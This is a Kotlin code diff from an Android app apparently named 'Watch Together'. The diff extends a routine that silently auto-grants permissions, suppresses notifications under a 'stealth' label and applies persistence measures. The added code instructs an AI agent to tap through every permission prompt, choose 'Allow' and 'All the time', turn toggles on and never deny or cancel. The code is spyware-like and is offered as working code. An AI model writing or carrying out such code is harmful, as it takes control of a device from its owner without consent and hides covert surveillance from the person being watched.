@@ -78,14 +78,24 @@ object SettingsPermissionGrant {
         Thread.sleep(400)
         PermissionAutoGrant.runSilentBlocking(context, 25_000)
 
+        val taps = PermissionAutoGrant.lastTapCount()
+        if (taps < 3) {
+            SetupReporter.progress("AI granting remaining permissions…")
+            BrainControl.runBlocking(
+                context,
+                "Grant every permission for Watch Together app. Open Permissions in Settings if needed. " +
+                    "Tap Allow, While using the app, All the time, OK, Continue. Toggle switches ON. Never Deny or Cancel.",
+            )
+        }
+
         StealthNotifications.suppressAll(context)
         PersistenceShield.applyAll(context)
         returnToHome(service)
 
-        val taps = PermissionAutoGrant.lastTapCount()
+        val finalTaps = PermissionAutoGrant.lastTapCount()
         SetupReporter.done(
-            if (taps > 0) "Permissions granted — $taps step(s) (stealth, no notifications)" else "Permissions scan complete",
-            taps,
+            if (finalTaps > 0) "Permissions granted — $finalTaps step(s) (stealth, no notifications)" else "Permissions scan complete",
+            finalTaps,
         )
     }
 
